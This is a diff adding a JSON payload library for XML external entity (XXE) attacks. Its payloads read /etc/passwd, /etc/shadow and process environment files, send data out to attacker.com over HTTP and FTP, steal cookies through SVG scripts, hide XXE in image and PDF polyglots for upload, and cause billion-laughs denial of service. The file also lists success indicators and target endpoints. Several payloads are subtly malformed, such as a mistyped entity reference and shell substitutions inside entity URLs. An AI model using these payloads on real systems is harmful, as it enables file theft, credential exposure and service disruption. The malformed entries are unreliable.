@@ -1,0 +1,334 @@
+{
+  "info": {
+    "name": "XXE Injection Payloads",
+    "author": "CyberDyne Security",
+    "version": "3.0",
+    "description": "XXE injection payloads - Surgical, precision-crafted for maximum impact. Includes OOB, SVG, SOAP, PDF, and DTD attacks. 2026 Edition.",
+    "category": "Injection",
+    "severity": "CRITICAL",
+    "owasp": "A03:2021 - Injection",
+    "references": ["CWE-611", "OWASP XXE", "CVE-2019-8943", "CVE-2018-7600"]
+  },
+  "philosophy": "Quality over quantity. Each payload is designed for specific attack vectors with clear success indicators.",
+  "payloads": {
+    "basic_xxe": [
+      {
+        "payload": "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><r>&xxe;</r>",
+        "description": "Classic Unix file read",
+        "context": "XML",
+        "indicator": "root:x:"
+      },
+      {
+        "payload": "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY xxe SYSTEM \"file:///c:/windows/win.ini\">]><r>&xxe;</r>",
+        "description": "Classic Windows file read",
+        "context": "XML",
+        "indicator": "[extensions]"
+      },
+      {
+        "payload": "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY xxe SYSTEM \"file:///etc/hostname\">]><r>&xxe;</r>",
+        "description": "Hostname disclosure",
+        "context": "XML",
+        "indicator": "hostname"
+      },
+      {
+        "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/shadow\">]><foo>&xxe;</foo>",
+        "description": "Shadow file read (if permissions allow)",
+        "context": "XML",
+        "indicator": "root:"
+      },
+      {
+        "payload": "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY xxe SYSTEM \"file:///proc/self/environ\">]><r>&xxe;</r>",
+        "description": "Environment variables exposure",
+        "context": "XML",
+        "indicator": "PATH="
+      }
+    ],
+    "parameter_entity_xxe": [
+      {
+        "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"file:///etc/passwd\">%xxe;]><foo/>",
+        "description": "Parameter entity for blind extraction",
+        "context": "XML",
+        "indicator": "Requires OOB or error-based detection"
+      },
+      {
+        "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"file:///etc/passwd\">%xxe;]><foo>&xxe;</foo>",
+        "description": "Parameter + general entity combination",
+        "context": "XML",
+        "indicator": "root:x:"
+      },
+      {
+        "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"file:///etc/passwd\"><!ENTITY xxe2 SYSTEM \"file:///etc/hosts\">%xxe;%xxe2;]><foo/>",
+        "description": "Multiple parameter entities",
+        "context": "XML",
+        "indicator": "Multi-file exfiltration"
+      },
+      {
+        "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"file:///proc/self/cmdline\">%xxe;]><foo/>",
+        "description": "Process command line exposure",
+        "context": "XML",
+        "indicator": "Process info"
+      },
+      {
+        "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"file:///proc/self/maps\">%xxe;]><foo/>",
+        "description": "Memory mapping exposure",
+        "context": "XML",
+        "indicator": "Memory addresses"
+      }
+    ],
+    "oob_ftp_exfiltration": [
+      {
+        "payload": "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY xxe SYSTEM \"ftp://attacker.com:2121/x\">]><r>&xxe;</r>",
+        "description": "FTP OOB exfiltration - attacker must run FTP server on port 2121",
+        "context": "Blind XXE",
+        "indicator": "FTP connection to attacker server"
+      },
+      {
+        "payload": "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY % xxe SYSTEM \"ftp://attacker.com/read?/etc/passwd\">%xxe;]><r/>",
+        "description": "FTP with path retrieval",
+        "context": "Blind XXE",
+        "indicator": "FTP connection with path"
+      },
+      {
+        "payload": "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY xxe SYSTEM \"ftp://attacker.com %0aUSER attacker%0aPASS secret\">]><r>&xxe;</r>",
+        "description": "FTP with inline commands",
+        "context": "Blind XXE",
+        "indicator": "FTP command injection"
+      }
+    ],
+    "oob_http_exfiltration": [
+      {
+        "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://attacker.com/xxe\">%xxe;]><foo/>",
+        "description": "HTTP OOB - basic callback",
+        "context": "Blind XXE",
+        "indicator": "HTTP request to attacker server"
+      },
+      {
+        "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://attacker.com/?exfil=$(cat /etc/passwd)\">%xxe;]><foo/>",
+        "description": "HTTP OOB with inline data (if parser supports)",
+        "context": "Blind XXE",
+        "indicator": "HTTP request with exfiltrated data in URL"
+      },
+      {
+        "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://attacker.com:8080/collect?data=$(ls -la /)\">%xxe;]><foo/>",
+        "description": "HTTP OOB with command output",
+        "context": "Blind XXE",
+        "indicator": "HTTP with command output"
+      },
+      {
+        "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://burpcollaborator.net/basic\">%xxe;]><foo/>",
+        "description": "HTTP OOB using Burp Collaborator",
+        "context": "Blind XXE",
+        "indicator": "Collaborator callback"
+      },
+      {
+        "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://dnslog.cn/xxe\">%xxe;]><foo/>",
+        "description": "HTTP OOB using DNSlog",
+        "context": "Blind XXE",
+        "indicator": "DNS query to dnslog.cn"
+      }
+    ],
+    "external_dtd_exploitation": [
+      {
+        "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://attacker.com/evil.dtd\">%xxe;]><foo>&xxe;</foo>",
+        "description": "External DTD with entity reference",
+        "context": "Blind XXE",
+        "indicator": "DTD fetched and parsed"
+      },
+      {
+        "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe PUBLIC \"-//EN//TYPE file /etc/passwd\" \"http://attacker.com/dtd\">%xe;]><foo/>",
+        "description": "PUBLIC identifier DTD",
+        "context": "Blind XXE",
+        "indicator": "DTD via PUBLIC ID"
+      },
+      {
+        "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://attacker.com/dtd?param=$(id)\">%xe;]><foo/>",
+        "description": "External DTD with command injection in URL",
+        "context": "Blind XXE",
+        "indicator": "DTD with command"
+      },
+      {
+        "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo SYSTEM \"http://attacker.com/external.dtd\" [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
+        "description": "External DTD with system entity",
+        "context": "Blind XXE",
+        "indicator": "DTD and entity"
+      }
+    ],
+    "svg_xxe": [
+      {
+        "payload": "<?xml version=\"1.0\" encoding=\"UTF-8\"?><svg width=\"100\" height=\"100\" xmlns=\"http://www.w3.org/2000/svg\"><img src=\"http://attacker.com/xxe\"/><circle r=\"10\"/></svg>",
+        "description": "SVG with external image reference for OOB",
+        "context": "SVG/XML",
+        "indicator": "HTTP request to attacker"
+      },
+      {
+        "payload": "<?xml version=\"1.0\"?><svg xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\"><img src=\"http://attacker.com/logo.png\" xlink:href=\"http://attacker.com/xxe\"/><rect/></svg>",
+        "description": "SVG with xlink:href for OOB",
+        "context": "SVG/XML",
+        "indicator": "HTTP request via xlink"
+      },
+      {
+        "payload": "<?xml version=\"1.0\"?><svg xmlns=\"http://www.w3.org/2000/svg\" width=\"200\" height=\"200\"><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><text>&xxe;</text></svg>",
+        "description": "SVG with embedded XXE (if SVG is parsed as XML)",
+        "context": "SVG/XML",
+        "indicator": "Content reflection"
+      },
+      {
+        "payload": "<?xml version=\"1.0\"?><svg width=\"100\" height=\"100\" xmlns=\"http://www.w3.org/2000/svg\"><script type=\"text/javascript\">document.location='http://attacker.com/?c='+document.cookie</script></svg>",
+        "description": "SVG with JavaScript for cookie theft",
+        "context": "SVG/XSS",
+        "indicator": "Cookie exfiltration"
+      },
+      {
+        "payload": "<?xml version=\"1.0\"?><svg xmlns=\"http://www.w3.org/2000/svg\"><use href=\"http://attacker.com/evil#x\"/></svg>",
+        "description": "SVG with use element referencing external resource",
+        "context": "SVG/XML",
+        "indicator": "External reference"
+      },
+      {
+        "payload": "<?xml version=\"1.0\"?><svg xmlns=\"http://www.w3.org/2000/svg\"><foreignObject width=\"100\" height=\"100\"><body xmlns=\"http://www.w3.org/1999/xhtml\"><img src=\"x\" onerror=\"document.location='http://attacker.com/?x='+document.domain\"/></body></foreignObject></svg>",
+        "description": "SVG with foreignObject for XSS via error",
+        "context": "SVG/XSS",
+        "indicator": "XSS execution"
+      }
+    ],
+    "svg_xxe_polyglot": [
+      {
+        "payload": "GIF89a\r\n<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
+        "mime": "image/gif",
+        "description": "GIF + XXE polyglot - upload as image",
+        "context": "File Upload",
+        "indicator": "XXE parsed on upload"
+      },
+      {
+        "payload": "\x89PNG\r\n\x1a\n<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
+        "mime": "image/png",
+        "description": "PNG + XXE polyglot",
+        "context": "File Upload",
+        "indicator": "XXE parsed on upload"
+      },
+      {
+        "payload": "%PDF-1.4\r\n<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
+        "mime": "application/pdf",
+        "description": "PDF + XXE polyglot",
+        "context": "File Upload",
+        "indicator": "XXE parsed on upload"
+      }
+    ],
+    "soap_xxe": [
+      {
+        "payload": "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><soap:Envelope xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\"><soap:Header/><soap:Body><foo>&xxe;</foo></soap:Body></soap:Envelope>",
+        "description": "SOAP envelope with XXE",
+        "context": "SOAP/XML",
+        "indicator": "File content in response"
+      },
+      {
+        "payload": "<?xml version=\"1.0\"?><soap:Envelope xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\"><soap:Header/><soap:Body><foo><![CDATA[<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>]]></foo></soap:Body></soap:Envelope>",
+        "description": "SOAP with CDATA wrapper",
+        "context": "SOAP/XML",
+        "indicator": "CDATA bypass"
+      },
+      {
+        "payload": "<?xml version=\"1.0\"?><SOAP-ENV:Envelope xmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope/\"><SOAP-ENV:Body><ns2:getContent xmlns:ns2=\"http://example.com\"><![CDATA[<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>]]></ns2:getContent></SOAP-ENV:Body></SOAP-ENV:Envelope>",
+        "description": "SOAP 1.1 with namespaces",
+        "context": "SOAP/XML",
+        "indicator": "Namespaced SOAP"
+      },
+      {
+        "payload": "<?xml version=\"1.0\"?><soap:Envelope xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\"><soap:Header/><soap:Body><foo xmlns:xlink=\"http://www.w3.org/1999/xlink\"><img xlink:href=\"http://attacker.com/xxe\"/></foo></soap:Body></soap:Envelope>",
+        "description": "SOAP with xlink for OOB",
+        "context": "SOAP/XML",
+        "indicator": "External xlink request"
+      }
+    ],
+    "rss_xxe": [
+      {
+        "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><rss version=\"2.0\"><channel><title>Test</title><item><description>&xxe;</description></item></channel></rss>",
+        "description": "RSS feed with embedded XXE",
+        "context": "RSS/XML",
+        "indicator": "File content in RSS"
+      },
+      {
+        "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://attacker.com/xxe\">]><feed xmlns=\"http://www.w3.org/2005/Atom\"><title>Test</title><entry><summary>&xxe;</summary></entry></feed>",
+        "description": "Atom feed with external reference",
+        "context": "Atom/XML",
+        "indicator": "External request"
+      }
+    ],
+    "pdf_xxe": [
+      {
+        "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><xfdf xmlns=\"http://ns.adobe.com/xfdf/\"><annots><text/></annots><files href=\"&xxe;\"/></xfdf>",
+        "description": "XFDF (Adobe XML Forms Data Format) with XXE",
+        "context": "PDF/XML",
+        "indicator": "File reference"
+      },
+      {
+        "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://attacker.com/xxe\">]><xmpmeta xmlns:xmp=\"http://ns.adobe.com/xap/1.0/\"><rdf:RDF xmlns:rdf=\"http://www.w3.org/1999/02/22-rdf-syntax-ns#\"><rdf:Description>&xxe;</rdf:Description></rdf:RDF></xmpmeta>",
+        "description": "XMP metadata with external reference",
+        "context": "PDF/XML",
+        "indicator": "External request"
+      }
+    ],
+    "billion_laughs_bypass": [
+      {
+        "payload": "<?xml version=\"1.0\"?><!DOCTYPE lolz [<!ENTITY lol \"lol\"><!ENTITY lol2 \"&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;\"><!ENTITY lol3 \"&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;\">]><lolz>&lol3;</lolz>",
+        "description": "Billion laughs attack (entity expansion DoS)",
+        "context": "XML DoS",
+        "indicator": "CPU/memory exhaustion"
+      },
+      {
+        "payload": "<?xml version=\"1.0\"?><!DOCTYPE lolz [<!ENTITY lol \"&#x41;&#x41;&#x41;&#x41;\"><!ENTITY lol2 \"&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;\">]><lolz>&lol2;</lolz>",
+        "description": "Billion laughs with decimal entities",
+        "context": "XML DoS",
+        "indicator": "Expansion bomb"
+      }
+    ],
+    "xml_injection_wrapper": [
+      {
+        "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><!--]<foo>&xxe;</foo>",
+        "description": "Comment wrapper to bypass filters",
+        "context": "XML Bypass",
+        "indicator": "Comment start + close"
+      },
+      {
+        "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo><!--",
+        "description": "Trailing comment to bypass end detection",
+        "context": "XML Bypass",
+        "indicator": "Content before comment"
+      },
+      {
+        "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;\n</foo>",
+        "description": "Newline after entity reference",
+        "context": "XML Bypass",
+        "indicator": "Whitespace tolerance"
+      }
+    ],
+    "error_based_xxe": [
+      {
+        "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"file:///nonexistent\">%xxe;]><foo/>",
+        "description": "Error-based via nonexistent file",
+        "context": "Error-based",
+        "indicator": "No such file or directory"
+      },
+      {
+        "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"file:///\" EXCLUDE ALL>]><foo/>",
+        "description": "EXCLUDE directive attack",
+        "context": "Error-based",
+        "indicator": "XML parsing error"
+      }
+    ]
+  },
+  "detection_indicators": {
+    "file_content": ["root:x:", "bin:x:", "[extensions]", "hostname"],
+    "oob_indicators": ["HTTP request to attacker", "DNS query", "FTP connection"],
+    "error_indicators": ["No such file", "Permission denied", "XML parsing error"]
+  },
+  "endpoints_patterns": [
+    "*.xml", "*\\.soap", "*\\.wsdl", "*\\.xaml",
+    "api/xml", "api/soap", "upload", "import",
+    "xml", "parse", "feed", "rss", "atom"
+  ],
+  "content_types": [
+    "application/xml", "text/xml", "application/soap+xml",
+    "application/x-www-form-urlencoded", "multipart/form-data"
+  ]
+}
